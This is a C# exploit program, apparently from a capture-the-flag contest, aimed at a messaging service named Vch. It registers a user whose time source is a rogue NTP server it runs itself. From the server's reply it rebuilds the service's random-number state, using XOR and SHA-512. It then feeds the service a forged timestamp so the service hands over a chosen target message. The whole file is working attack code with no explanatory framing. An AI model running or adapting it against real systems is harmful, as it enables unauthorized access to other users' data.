using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using MongoDB.Bson;
using UdpProxy;
using Vch.Core.Helpers;
using Vch.Core.Meta;
using VchUtils;

namespace Exploit
{
    class Program
    {
        static void Main(string[] args)
        {

            try
            {
                var cancelationTokenSource = new CancellationTokenSource();

                var initialTime = new byte[8];

                NTPServer.StartListen(124, initialTime, cancelationTokenSource.Token);
                var client = new VchClient(new Uri($"http://{args[0]}"));

                var targetMessage = UInt64.Parse(args[1]);


                var userInfo = client.RegisterUser(new UserMeta
                {
                    FirstName = "",
                    LastName = "",
                    TrackingCode = "",
                    VaultTimeSource = new IPEndpointWrapper
                    {
                        IPAddres = args[2],
                        Port = 124
                    },
                }).Result;

                cancelationTokenSource.Cancel();
                Thread.Sleep(100);

                var userIdNumber = UInt64.Parse(userInfo.UserId);


                var milllisecondLong = BitConverter.ToUInt64(initialTime);

                var xored = (milllisecondLong ^ userIdNumber).ToBytes();

                var prevRandom = new byte[8];

                Array.Copy(xored, prevRandom, 6);

                var shaProvider = new SHA512Managed();

                var hash = shaProvider.ComputeHash(prevRandom);

                var nextRnd = new byte[8];
                Array.Copy(hash, nextRnd, 6);

                var rndNumber = BitConverter.ToUInt64(nextRnd);
                var hackerTime = rndNumber ^ targetMessage;

                NTPServer.StartListen(124, hackerTime.ToBytes(), CancellationToken.None);

                var message = client.PostMessage(userInfo.UserId, "").Result;
                Console.WriteLine(message.ToJson());
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }


        class NTPServer
        {

            public static async Task StartListen(int port, byte[] time, CancellationToken token)
            {
                using (var server = new UdpListener(port))
                {

                    while (!token.IsCancellationRequested)
                    {
                        try
                        {
                            var udpMessageTask = server.Receive();

                            while (!udpMessageTask.IsCompleted && !token.IsCancellationRequested)
                            {
                                await Task.Delay(10);
                            }
                            if (token.IsCancellationRequested) return;

                            var udpMessage = udpMessageTask.Result;

                            var datagramm = new byte[48];

                            Array.Copy(time, 0, datagramm, 40, 8);
                            server.Reply(datagramm, udpMessage.Sender);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }
                    }
                }

            }
        }
    }
}
